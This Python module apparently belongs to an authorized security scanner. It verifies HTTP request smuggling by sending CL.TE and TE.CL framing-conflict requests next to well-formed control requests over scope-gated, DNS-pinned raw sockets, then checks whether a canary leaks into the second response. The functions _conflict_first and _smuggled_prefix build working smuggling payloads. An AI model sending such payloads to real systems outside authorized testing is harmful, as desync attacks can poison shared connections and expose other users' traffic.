"""smuggling_redrive — a runner-owned, GATED raw-socket re-drive → ACHIEVED-DESYNC FACT (Wave-4.2, CWE-444).

This retires audit A12 (#269), which capped the ``request_smuggling`` signal at an UNCONFIRMED LEAD because it
rested on TIMING (a CL.TE / TE.CL probe that HUNG longer than a control — a hypothesis a normal origin
awaiting an incomplete declared body reproduces identically). This module replaces the timing signal with a
DETERMINISTIC DIFFERENTIAL a normal origin cannot produce:

  * VIGIL opens ONE authorized connection and sends TWO requests it crafts itself. The FIRST carries a framing
    conflict (CL.TE / TE.CL / an obfuscated Transfer-Encoding) whose smuggled prefix is a request to a reflect
    surface embedding a UNIQUE, high-entropy per-probe canary; the SECOND is a normal follow-up.
  * On an IDENTICAL SECOND VIGIL-owned connection it sends the SAME bytes but WELL-FORMED (no conflict) plus
    the SAME follow-up. The only variable between the two legs is the framing conflict.
  * If the back-end desynced, VIGIL's OWN SECOND request on the CONFLICT connection is corrupted by the
    leftover smuggled prefix and its response ECHOES the canary VIGIL never sent in that second request; the
    WELL-FORMED control connection's second response is normal and does NOT echo it. The deterministic
    ``verify.oracles.smuggling_desync_oracle`` re-derives this canary differential from the RETAINED RAW
    second-request responses at every re-verification — no latency, no bare mangled-method status.

NO victim is ever poisoned: both requests, on both connections, are VIGIL's OWN on VIGIL's OWN sockets, so the
"poisoned next request" is VIGIL's own. Shared-pool desyncs that would need a real co-tenant victim to observe
stay a LEAD (not driven here).

CONCRETE SECURITY REQUIREMENT (audit re-gate). Request smuggling needs EXACT bytes on the wire, so it drops to
a raw socket below :class:`SovereignHttpxTransport`. A raw socket that skipped the sovereign transport would
be an egress hole, so :func:`_gated_raw_burst` re-gates every burst through ``agents.scope_gate.validate_action``
(the protected-domain floor / charter / scope / posture chain) AND the URL-shaped ``reachability_cloud._authorize``
gate (kill-switch → single-host → ACTIVE_RECON → charter scope), THEN DNS-pins the connection to the validated
address (``dns_pin.resolve_and_validate``) and connects the raw socket to that PINNED IP — so no byte leaves the
box for an out-of-scope / kill-switched / rebinding destination. A refusal means VIGIL never observed the
target: no channel, never a false CLEAN.

FATAL-2: every framework-touching import is FUNCTION-LOCAL — importing this module co-loads no offense engine.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Optional

# The single class this runner mints, mapped to its ONE registered evidence branch (kept in lockstep with
# docs/capability-matrix/evidence-branches.json and wiring._redrive_branch_for).
SMUGGLING_FACT_CLASSES = ("request_smuggling",)
_BRANCH_FOR = {"request_smuggling": "request_smuggling.differential_desync"}

# The framing-conflict techniques VIGIL drives over the single connection it owns. Each is (name, builder):
# the builder returns the raw first-request bytes for the CONFLICT leg. The WELL-FORMED control first request
# is the SAME bytes with the conflict removed, so the only variable between the two legs is the conflict.
_TECHNIQUES = ("CL.TE", "TE.CL")

_MAX_RAW = 65536       # bounded read — a desync confirmation needs only the first two responses


@dataclass
class SmugglingRedriveResult:
    url: str
    facts: list = field(default_factory=list)          # AdapterResult (is_fact), signed
    leads: list = field(default_factory=list)          # AdapterResult (channel-confirmed non-fact)
    inconclusive: list = field(default_factory=list)   # (technique, reason) — no channel on a leg
    admissions: list = field(default_factory=list)     # (branch, verdict, reason) — the audit trail
    contexts: dict = field(default_factory=dict)       # finding_ref -> oracle_context (offline re-verify)
    refused: bool = False
    notes: list = field(default_factory=list)

    @property
    def n_facts(self) -> int:
        return len(self.facts)


def _smuggled_prefix(host: str, canary: str) -> str:
    """The smuggled request VIGIL embeds in the conflict leg's first request — a GET to a reflect surface
    carrying the UNIQUE per-probe canary. If the back-end desyncs, this request is served as VIGIL's OWN
    second response on the socket, echoing the canary."""
    return (f"GET /vigil-reflect?c={canary} HTTP/1.1\r\nHost: {host}\r\n"
            f"X-Vigil-Canary: {canary}\r\nConnection: keep-alive\r\n\r\n")


def _follow_up(host: str) -> bytes:
    """VIGIL's OWN normal, DISTINCT second request, actually sent on the SAME socket AFTER the first response
    has been fully read. It deliberately carries NO canary: if this request's GENUINE response echoes the
    per-probe canary, that canary can ONLY have come from the leftover smuggled prefix the desynced back-end
    prepended to this request (an achieved desync) — never from an endpoint that merely reflects this request's
    own bytes back. On a well-formed / benign connection its response is the ordinary ``/vigil-follow``
    response and never contains the canary."""
    return (f"GET /vigil-follow HTTP/1.1\r\nHost: {host}\r\n"
            f"Connection: close\r\n\r\n").encode("latin-1")


def _conflict_first(technique: str, host: str, canary: str) -> bytes:
    """The CONFLICT leg's first request: a framing conflict whose smuggled tail is ``_smuggled_prefix``.

    CL.TE — the front-end honours Content-Length and forwards the whole body; a chunked back-end reads the
    terminating ``0`` chunk and treats the smuggled tail as the next request. TE.CL — the front-end honours
    Transfer-Encoding while a Content-Length back-end stops early, leaving the tail on the socket. Either way
    the smuggled prefix becomes the head of VIGIL's OWN next request."""
    smuggled = _smuggled_prefix(host, canary)
    # ``Connection: keep-alive`` keeps the socket open so VIGIL can drive its GENUINE second request on it (the
    # Content-Length below counts the BODY only, so the header does not perturb the framing math). It is added
    # to BOTH the conflict and the control first request, so the ONLY variable between the two legs stays the
    # framing conflict itself.
    if technique == "TE.CL":
        body = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
        return (f"POST /vigil-start HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
                f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n{body}").encode("latin-1")
    # default CL.TE
    body = f"0\r\n\r\n{smuggled}"
    return (f"POST /vigil-start HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
            f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}").encode("latin-1")


def _control_first(host: str, canary: str) -> bytes:
    """The CONTROL leg's first request: the SAME reflect surface + canary, but WELL-FORMED (a single, honest
    Content-Length, no Transfer-Encoding), so NO leftover prefix is created and the follow-up's response is
    ordinary. The only variable vs the conflict leg is the framing conflict."""
    body = _smuggled_prefix(host, canary)
    return (f"POST /vigil-start HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
            f"Content-Length: {len(body)}\r\n\r\n{body}").encode("latin-1")


class _RawResponseReader:
    """Reads DISCRETE HTTP responses off a raw socket, EACH BY ITS OWN FRAMING (chunked / Content-Length /
    connection-close), buffering any surplus bytes so a pipelined or desync-leftover response is read as the
    NEXT ``read_response()`` — never a lexical split of one accumulated blob on ``HTTP/1.``.

    This is what makes the second-request differential real: after VIGIL sends its first request the reader
    consumes EXACTLY the first response (and no more), leaving any leftover/pipelined bytes buffered; VIGIL then
    sends its DISTINCT second request and the next ``read_response()`` returns that request's GENUINE response.
    A benign server that echoes the first request (canary and all) in a 400/405 body cannot fool it: that echo
    lives in the FIRST response, and the reader never conflates it with the second."""

    def __init__(self, sock: Any, *, budget: int) -> None:
        self._sock = sock
        self._buf = bytearray()
        self._closed = False
        self._budget = budget          # total bytes this reader may pull off the wire (bounded)

    def _recv(self) -> bool:
        if self._closed or self._budget <= 0:
            return False
        import socket as _socket  # noqa: PLC0415
        try:
            chunk = self._sock.recv(min(4096, self._budget))
        except _socket.timeout:
            return False
        except OSError:
            self._closed = True
            return False
        if not chunk:
            self._closed = True
            return False
        self._buf.extend(chunk)
        self._budget -= len(chunk)
        return True

    def _need(self, n: int) -> bool:
        while len(self._buf) < n:
            if not self._recv():
                return False
        return True

    def _need_marker(self, marker: bytes) -> bool:
        while marker not in self._buf:
            if not self._recv():
                return False
        return True

    @property
    def exhausted(self) -> bool:
        """True once the peer has closed AND nothing is left buffered — no further response can be read (so
        driving a second request is pointless)."""
        return self._closed and not self._buf

    def _read_chunked(self) -> bytes:
        out = bytearray()
        while True:
            if not self._need_marker(b"\r\n"):
                break
            line = bytes(self._buf).split(b"\r\n", 1)[0]
            del self._buf[: len(line) + 2]
            size_txt = line.split(b";", 1)[0].strip()
            try:
                size = int(size_txt, 16)
            except ValueError:
                break
            if size == 0:
                if self._need(2):              # trailing CRLF after the final chunk
                    del self._buf[:2]
                break
            if not self._need(size + 2):
                out.extend(self._buf)
                self._buf.clear()
                break
            out.extend(self._buf[:size])
            del self._buf[: size + 2]
        return bytes(out)

    def _read_body(self, headers: "dict[str, str]", status: "Optional[int]") -> bytes:
        te = headers.get("transfer-encoding", "").lower()
        if "chunked" in te:
            return self._read_chunked()
        cl = headers.get("content-length")
        if cl is not None and cl.strip().isdigit():
            n = int(cl.strip())
            self._need(n)
            body = bytes(self._buf[:n])
            del self._buf[:n]
            return body
        # No length framing: a bodyless status has no body; otherwise the body runs to connection close, so
        # draining it necessarily closes the socket (there is no persistent connection to drive a second
        # request over — the caller sees ``exhausted`` and treats the second leg as no-channel).
        if status in (204, 304) or (status is not None and 100 <= status < 200):
            return b""
        while self._recv():
            pass
        body = bytes(self._buf)
        self._buf.clear()
        self._closed = True
        return body

    def read_response(self) -> "dict":
        """Read exactly ONE HTTP response as ``{channel, status, reason, body}``. ``channel`` is False when no
        complete response could be read (peer silent/closed with no header block)."""
        if not self._need_marker(b"\r\n\r\n"):
            return {"channel": False, "status": None, "reason": "", "body": ""}
        head = bytes(self._buf).split(b"\r\n\r\n", 1)[0]
        del self._buf[: len(head) + 4]
        lines = head.split(b"\r\n")
        status: Optional[int] = None
        reason = ""
        bits = lines[0].decode("latin-1", "replace").split(" ", 2)
        if len(bits) >= 2 and bits[1].isdigit():
            status = int(bits[1])
            reason = bits[2] if len(bits) > 2 else ""
        headers: dict[str, str] = {}
        for ln in lines[1:]:
            i = ln.find(b":")
            if i > 0:
                headers[ln[:i].strip().lower().decode("latin-1", "replace")] = \
                    ln[i + 1:].strip().decode("latin-1", "replace")
        body = self._read_body(headers, status)
        return {"channel": True, "status": status, "reason": reason,
                "body": body.decode("latin-1", "replace")}


def _gated_raw_burst(origin_url: str, first_payload: bytes, follow_up: bytes, *, slug: str, posture: str,
                     timeout: float) -> "tuple[dict, str]":
    """Drive ONE fresh raw socket to ``origin_url``: send ``first_payload`` (the framing-conflict or the
    well-formed control first request), READ AND CONSUME its first response by that response's own framing,
    then ACTUALLY SEND ``follow_up`` (VIGIL's OWN DISTINCT second request) on the SAME socket and read ITS
    GENUINE response. Returns ``(second_response {channel,status,reason,body}, refused_reason)`` — the SECOND
    request's real response is what the differential oracle adjudicates; it is NEVER a lexical split of the
    first response's bytes.

    This runs ONLY after the full gate chain clears and is pinned to the validated address. On any refusal
    (gate deny / kill-switch / out-of-scope / DNS-pin rejection) or a transport failure with nothing observed,
    the reason is non-empty and no byte left the box (channel False). If the first response is read but the
    connection does not persist for the second request, the second-response record is channel False (an honest
    INCONCLUSIVE, never a fabricated leak). The RUNNER crafted both payloads; nothing here is tool/LLM-supplied.
    FATAL-2: framework imports are function-local."""
    import socket  # noqa: PLC0415
    from urllib.parse import urlsplit  # noqa: PLC0415

    from framework.v2.agents.scope_gate import validate_action  # noqa: PLC0415 — the ScopeDecision gate
    from framework.v2.verify.reachability_cloud import _authorize  # noqa: PLC0415 — URL-shaped active-recon gate

    from .dns_pin import resolve_and_validate  # noqa: PLC0415

    empty = {"channel": False, "status": None, "reason": "", "body": ""}

    # 1. ScopeDecision gate: protected-domain floor → charter present+signed → URL parseable → host in scope →
    #    posture. A raw socket must clear the SAME authority as any HTTP action, or it is an egress hole.
    try:
        decision = validate_action(slug=slug, method="POST", target_url=origin_url, posture=posture)  # type: ignore[arg-type]
    except Exception as exc:  # noqa: BLE001 — a gate error fails closed
        return dict(empty), f"scope-gate error (fail-closed): {type(exc).__name__}: {exc}"
    if not decision.allowed:
        return dict(empty), f"validate_action refused ({decision.refusal_kind}): {decision.reason}"

    # 2. URL-shaped gate (kill-switch → single-host → ACTIVE_RECON → charter scope → http(s), no creds). Belt
    #    and suspenders with the ScopeDecision above: the kill-switch and single-host discipline live here.
    refusal = _authorize(origin_url, slug)
    if refusal is not None:
        return dict(empty), f"reachability gate refused: {refusal}"

    sp = urlsplit(origin_url)
    host = sp.hostname or ""
    port = sp.port or (443 if sp.scheme == "https" else 80)

    # 3. DNS-pin: resolve ONCE, require EVERY address to satisfy the SAME gate, and connect the raw socket to
    #    the validated address — closing the rebinding / short-TTL / poisoned-resolver window a raw connect
    #    would otherwise reopen (the sovereign transport pins for httpx; we pin the raw socket the same way).
    def _addr_authorized(address: str) -> bool:
        literal = f"[{address}]" if str(address).count(":") > 1 else address
        return _authorize(f"http://{literal}/", slug) is None

    resolution = resolve_and_validate(host, port, _addr_authorized)
    if not resolution.allowed:
        return dict(empty), f"dns-pin refused: {resolution.refused_reason}"

    try:
        s = socket.create_connection((resolution.pinned, port), timeout=timeout)
    except OSError as exc:
        return dict(empty), f"connect error (no channel): {type(exc).__name__}: {exc}"
    try:
        s.settimeout(timeout)
        reader = _RawResponseReader(s, budget=_MAX_RAW)
        # 1. Send the first request and CONSUME EXACTLY its first response (leaving any leftover/pipelined
        #    bytes — e.g. the desync-served smuggled response — buffered in the reader).
        s.sendall(first_payload)
        first = reader.read_response()
        if not first["channel"]:
            return dict(empty), "no first response observed (no channel to drive the second request)"
        if reader.exhausted:
            # The connection did not persist past the first response — VIGIL cannot drive a real second
            # request over it. That is an honest INCONCLUSIVE (channel False on the second), never a leak.
            return dict(empty), "connection did not persist after the first response — no second request driven"
        # 2. ACTUALLY SEND VIGIL's OWN DISTINCT second request on the SAME socket and read its GENUINE response.
        #    On a desynced back-end this reads the leftover smuggled prefix's response (echoing the canary VIGIL
        #    never sent in THIS request); on a well-formed / benign origin it reads the ordinary follow-up
        #    response (no canary), whatever the first response's error page contained.
        s.sendall(follow_up)
        second = reader.read_response()
        return second, ""
    except OSError as exc:
        return dict(empty), f"transport error: {type(exc).__name__}: {exc}"
    finally:
        try:
            s.close()
        except OSError:
            pass


def smuggling_redrive(url: str, *, slug: str, engagement_slug: str, signers: "list[tuple[str, str]]",
                      posture: str = "AUDIT", timeout: float = 6.0) -> SmugglingRedriveResult:
    """Re-drive ``url`` for HTTP request smuggling through the gated raw-socket differential + the deterministic
    ``smuggling_desync_oracle``, and mint a signed, offline-re-verifiable FACT ONLY when the oracle confirms an
    ACHIEVED desync (a unique canary echoed in VIGIL's OWN conflict-leg second response and absent from the
    well-formed control leg) over VIGIL's OWN live, gated capture. A leg that established no channel is
    INCONCLUSIVE (never CLEAN). Never raises (a probe error is recorded and what held is returned)."""
    import secrets  # noqa: PLC0415 — a fresh per-probe canary for the LIVE probe (never part of the oracle)
    from urllib.parse import urlsplit  # noqa: PLC0415

    from framework.v2.verify.adapter import FindingContext  # noqa: PLC0415
    from framework.v2.verify.oracles import smuggling_desync_oracle  # noqa: PLC0415

    from ..oracle_adapter import certify_admitted  # noqa: PLC0415 (FATAL-2: function-local)
    from .verdict import Verdict, admit, branch_ids  # noqa: PLC0415

    res = SmugglingRedriveResult(url=url)
    branch = _BRANCH_FOR["request_smuggling"]
    if branch not in branch_ids():
        res.notes.append(f"branch {branch!r} is not registered — cannot admit (fail-closed)")
        return res

    sp = urlsplit(url)
    if sp.scheme != "http":
        # The raw-socket probes speak cleartext; an https origin escalates to a purpose-built tool (LEAD).
        res.notes.append(f"{sp.scheme!r} origin is out of scope for the cleartext raw-socket re-drive (LEAD)")
        return res
    host = sp.hostname or ""
    origin_url = f"http://{sp.netloc}/"

    follow_up = _follow_up(host)   # VIGIL's OWN distinct second request — identical on both legs, no canary
    for technique in _TECHNIQUES:
        canary = "vgsmug" + secrets.token_hex(13)   # unique, high-entropy, >= 12 alnum chars
        # CONFLICT leg: first request carries the framing conflict; then VIGIL's OWN second request is sent on
        # the SAME socket and its GENUINE response captured (the desync leaks the canary into it).
        conflict_leg, why_c = _gated_raw_burst(origin_url, _conflict_first(technique, host, canary), follow_up,
                                               slug=slug, posture=posture, timeout=timeout)
        if why_c and not conflict_leg["channel"]:
            if why_c.startswith(("validate_action refused", "reachability gate refused", "dns-pin refused")):
                res.refused = True
            res.inconclusive.append((technique, f"conflict leg: {why_c}"))
            res.notes.append(f"{technique} conflict leg not observed: {why_c}")
            continue
        # CONTROL leg: the SAME bytes but WELL-FORMED (no conflict) + the SAME second request. The only variable
        # vs the conflict leg is the framing conflict, so a canary echoed here means the origin reflects it
        # regardless of a desync (the oracle then REFUSES, never mints).
        control_leg, why_k = _gated_raw_burst(origin_url, _control_first(host, canary), follow_up,
                                              slug=slug, posture=posture, timeout=timeout)
        if why_k and not control_leg["channel"]:
            res.inconclusive.append((technique, f"control leg: {why_k}"))
            res.notes.append(f"{technique} control leg not observed: {why_k}")
            continue

        ctx = FindingContext.from_smuggling_desync(
            canary=canary, technique=technique,
            conflict_second=conflict_leg, control_second=control_leg,
        ).to_verifier_context()
        signal = smuggling_desync_oracle(ctx["smuggling_desync"])
        observed = {"channel_established": True, "conflict_and_control_second_requests_captured": True,
                    "unique_canary_minted": True, "raw_socket_action_validated": True}
        admitted = admit(branch, fired=signal.fired, conclusive=signal.conclusive, observed=observed)
        res.admissions.append((branch, admitted.verdict.value, admitted.reason))
        finding = {"check_id": f"smug:{technique}#{branch}", "bug_class": "request_smuggling",
                   "insertion_point": f"request:{technique}", "oracle_context": ctx}
        r = certify_admitted(finding, admitted, engagement_slug=engagement_slug, signers=signers,
                             provenance="live_redrive")
        res.contexts[r.finding_ref] = ctx
        if r.is_fact:
            res.facts.append(r)
            break   # one confirmed desync is proof; stop probing further techniques on this origin
        elif admitted.verdict is Verdict.INCONCLUSIVE:
            res.inconclusive.append((technique, admitted.reason))
        else:
            res.leads.append(r)
    return res
